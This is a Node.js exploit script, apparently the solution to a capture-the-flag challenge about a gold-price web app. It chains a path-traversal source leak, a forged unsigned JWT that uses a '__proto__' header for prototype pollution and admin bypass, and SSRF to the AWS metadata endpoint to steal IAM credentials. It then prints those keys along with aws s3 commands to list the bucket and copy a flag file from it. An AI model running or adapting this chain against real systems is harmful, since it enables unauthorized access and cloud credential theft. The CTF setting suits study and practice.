#!/usr/bin/env node

import { writeFile } from 'fs/promises';
import { dirname, resolve } from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const baseArg = process.argv[2] || 'http://localhost:8080';
const baseUrl = baseArg.replace(/\/+$/, '');

function b64url(input) {
  return Buffer.from(input)
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

async function leakServerSource() {
  const url = `${baseUrl}/assets../server.js`;
  const res = await fetch(url);
  if (!res.ok) {
    console.log(`[!] failed to leak source from ${url}: HTTP ${res.status}`);
    return null;
  }
  const body = await res.text();
  console.log(`[+] leaked server.js from ${url} (${body.length} bytes)`);
  console.log(body.split('\n').slice(0, 20).join('\n'));
  return body;
}

function forgePollutedToken(targetUrl = 'https://httpbin.org/' , method = 'GET') {
  const header = {
    typ: '__proto__',
    alg: 'HS256',
    reservedKeys: [],
    admin: true,
    baseURL: targetUrl,
    // Don't pollute validateStatus - let it remain as function from goldHttpClient
  };
  const payload = {
    sub: 999,
    username: 'admin',
    admin: true,
  };
  const headerB64 = b64url(JSON.stringify(header));
  const payloadB64 = b64url(JSON.stringify(payload));
  return `${headerB64}.${payloadB64}.`;
}

async function fetchAdminConfig(token) {
  const res = await fetch(`${baseUrl}/api/admin/config`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  const text = await res.text();
  console.log(`[+] admin config status: ${res.status}`);
  try {
    const parsed = JSON.parse(text);
    console.log(parsed);
    if (parsed && parsed.panelHtml) {
      console.log('[+] received admin panel HTML snippet:');
      console.log(parsed.panelHtml);
      const doc = `<!doctype html>
<html lang="vi">
  <head>
    <meta charset="utf-8" />
    <title>Gold Price Admin Panel (exfiltrated)</title>
    <style>
      body { font-family: system-ui, -apple-system, Segoe UI, sans-serif; background: #f5f5f5; padding: 2rem; }
      .wrapper { max-width: 480px; margin: 0 auto; background: #fff; border-radius: 10px; padding: 1.5rem; box-shadow: 0 10px 40px rgba(15,23,42,0.15); }
      .wrapper h1 { margin-top: 0; font-size: 1.4rem; }
      .admin-panel img { max-width: 100%; height: auto; }
      .muted { color: #555; font-size: 0.9rem; }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <h1>Bảng điều khiển quản trị</h1>
      ${parsed.panelHtml}
    </div>
  </body>
</html>`;
      const outPath = resolve(__dirname, 'admin-panel.html');
      await writeFile(outPath, doc, 'utf8');
      console.log(`[+] saved admin panel page -> ${outPath}`);
    } else {
      console.log('[!] admin panel HTML not present in response.');
      console.log(text);
    }
  } catch (_) {
    console.log('[-] non-JSON response body:');
    console.log(text);
  }
}

async function testPollution(token) {
  console.log('\n[+] Testing if prototype pollution worked...');
  
  // First, let's trigger the JWT verification to cause pollution
  const res1 = await fetch(`${baseUrl}/api/me`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  
  console.log(`[+] /api/me status: ${res1.status}`);
  const text1 = await res1.text();
  console.log(`[+] /api/me response: ${text1.substring(0, 200)}`);
}

async function getAWSMetadataIAMRole(token) {
  console.log('\n[+] Step 1: Getting IAM role name from AWS metadata service...');
  const res = await fetch(`${baseUrl}/api/gold?index=6m&direct=false`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  
  console.log(`[+] AWS metadata SSRF status: ${res.status}`);
  const text = await res.text();
  
  try {
    const parsed = JSON.parse(text);
    if (parsed.error && parsed.error.includes('ENOTFOUND')) {
      console.log('[-] SSRF failed - could not reach AWS metadata service');
      return null;
    }
    console.log('[+] AWS metadata response (JSON):');
    console.log(JSON.stringify(parsed, null, 2));
    return parsed.raw || parsed.data || text;
  } catch (_) {
    console.log('[+] AWS metadata response (raw text):');
    const responseText = text.substring(0, 500) + (text.length > 500 ? '...' : '');
    console.log(responseText);
    
    // Try to extract role name from response
    const roleMatch = text.match(/([a-zA-Z0-9-_]+)/);
    if (roleMatch) {
      console.log(`[+] Detected IAM role name: ${roleMatch[1]}`);
      return roleMatch[1];
    }
    return text;
  }
}

async function getAWSCredentials(token, roleName) {
  console.log(`\n[+] Step 2: Getting AWS credentials for role: ${roleName}`);
  
  // Create a new token targeting the specific role credentials endpoint
  const credentialsUrl = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}?`;
  const credToken = forgePollutedToken(credentialsUrl);
  
  const res = await fetch(`${baseUrl}/api/gold?index=6m&direct=false`, {
    headers: { Authorization: `Bearer ${credToken}` },
  });
  
  console.log(`[+] AWS credentials SSRF status: ${res.status}`);
  const text = await res.text();
  
  try {
    const parsed = JSON.parse(text);
    console.log('[+] AWS credentials response:');
    console.log(JSON.stringify(parsed, null, 2));
    
    // Try to parse the credentials from the response
    const rawData = parsed.raw || parsed.data || text;
    if (typeof rawData === 'string') {
      try {
        const credentials = JSON.parse(rawData);
        if (credentials.AccessKeyId && credentials.SecretAccessKey && credentials.Token) {
          console.log('[+] Successfully extracted AWS credentials!');
          return credentials;
        }
      } catch (e) {
        console.log('[-] Failed to parse credentials JSON');
      }
    }
    return null;
  } catch (_) {
    console.log('[+] AWS credentials response (raw text):');
    console.log(text.substring(0, 1000) + (text.length > 1000 ? '...' : ''));
    
    // Try to extract credentials from raw text
    try {
      const credentials = JSON.parse(text);
      if (credentials.AccessKeyId && credentials.SecretAccessKey && credentials.Token) {
        console.log('[+] Successfully extracted AWS credentials from raw response!');
        return credentials;
      }
    } catch (e) {
      console.log('[-] Could not parse credentials from response');
    }
    return null;
  }
}

async function listS3Objects(credentials, bucketName = 'gold-price-ctf-prod') {
  console.log(`\n[+] Step 3: Listing S3 objects in bucket: ${bucketName}`);
  
  if (!credentials || !credentials.AccessKeyId) {
    console.log('[-] No valid credentials available for S3 operations');
    return;
  }
  
  console.log('[+] Setting up AWS credentials in environment...');
  
  // Set up AWS credentials as environment variables for AWS CLI
  const awsConfig = `
export AWS_ACCESS_KEY_ID="${credentials.AccessKeyId}"
export AWS_SECRET_ACCESS_KEY="${credentials.SecretAccessKey}"
export AWS_SESSION_TOKEN="${credentials.Token}"
export AWS_DEFAULT_REGION="ap-southeast-1"
`;
  
  console.log('[+] AWS Credentials Configuration:');
  console.log('-----------------------------------');
  console.log(`AWS_ACCESS_KEY_ID="${credentials.AccessKeyId}"`);
  console.log(`AWS_SECRET_ACCESS_KEY="${credentials.SecretAccessKey}"`);
  console.log(`AWS_SESSION_TOKEN="${credentials.Token}"`);
  console.log('AWS_DEFAULT_REGION="ap-southeast-1"');
  console.log('-----------------------------------');
  
  console.log('\n[+] Run the following commands in your shell to list S3 objects:');
  console.log('================================================================');
  console.log(awsConfig.trim());
  console.log(`aws s3 ls s3://${bucketName}/ --recursive`);
  console.log(`aws s3 cp s3://${bucketName}/flags/flag.txt ./flag.txt`);
  console.log('================================================================');
  
  // Also try to use Node.js to make the S3 API call directly
  console.log('\n[+] Attempting direct S3 API call...');
  try {
    // We'll try to make a direct HTTP request to S3 API
    const s3Url = `https://${bucketName}.s3.ap-southeast-1.amazonaws.com/`;
    console.log(`[+] Trying to access S3 bucket directly: ${s3Url}`);
    
    // Note: This would require AWS4 signature which is complex to implement
    // The shell commands above are the practical approach
    console.log('[!] Direct S3 API calls require AWS4 signatures - use the shell commands above instead');
    
  } catch (error) {
    console.log(`[-] Error with direct S3 access: ${error.message}`);
  }
}

async function testSSRF(token) {
  console.log('\n[+] Testing basic SSRF via /api/gold endpoint with direct=false (goldHttpClient)...');
  const res = await fetch(`${baseUrl}/api/gold?index=6m&direct=false`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  
  console.log(`[+] SSRF test status: ${res.status}`);
  const text = await res.text();
  
  try {
    const parsed = JSON.parse(text);
    console.log('[+] SSRF response (JSON):');
    console.log(JSON.stringify(parsed, null, 2));
  } catch (_) {
    console.log('[+] SSRF response (raw text):');
    console.log(text.substring(0, 500) + (text.length > 500 ? '...' : ''));
  }
}

async function main() {
  const bucketName = process.argv[3] || 'gold-price-ctf-prod';
  
  console.log('==================================================');
  console.log('     AWS METADATA SSRF + S3 EXFILTRATION EXPLOIT');
  console.log('==================================================');
  
  // Step 0: Leak server source for reconnaissance
  await leakServerSource();
  
  // Step 1: Use prototype pollution to SSRF to AWS metadata service
  console.log('\n[+] PHASE 1: Prototype Pollution + AWS Metadata SSRF');
  const metadataToken = forgePollutedToken('http://169.254.169.254/latest/meta-data/iam/security-credentials/?');
  console.log('[+] Created polluted token targeting AWS metadata service');
  
  // Test pollution first
  await testPollution(metadataToken);
  
  // Get IAM role name
  const roleName = await getAWSMetadataIAMRole(metadataToken);
  if (!roleName) {
    console.log('[-] Failed to get IAM role name, aborting...');
    return;
  }
  
  // Step 2: Get AWS credentials for the role
  console.log('\n[+] PHASE 2: Extracting AWS Credentials');
  const credentials = await getAWSCredentials(metadataToken, roleName);
  if (!credentials) {
    console.log('[-] Failed to get AWS credentials, aborting...');
    return;
  }
  
  // Step 3: Use credentials to list S3 objects
  console.log('\n[+] PHASE 3: S3 Bucket Enumeration');
  await listS3Objects(credentials, bucketName);
  
  // Also get admin config for completeness
  console.log('\n[+] BONUS: Getting admin config...');
  const adminToken = forgePollutedToken('https://httpbin.org/');
  await fetchAdminConfig(adminToken);
  
  console.log('\n[+] EXPLOIT CHAIN COMPLETED!');
  console.log('[+] Check the shell commands above to access the S3 bucket');
}

main().catch((err) => {
  console.error('[-] exploit failed:', err.message);
  process.exit(1);
});
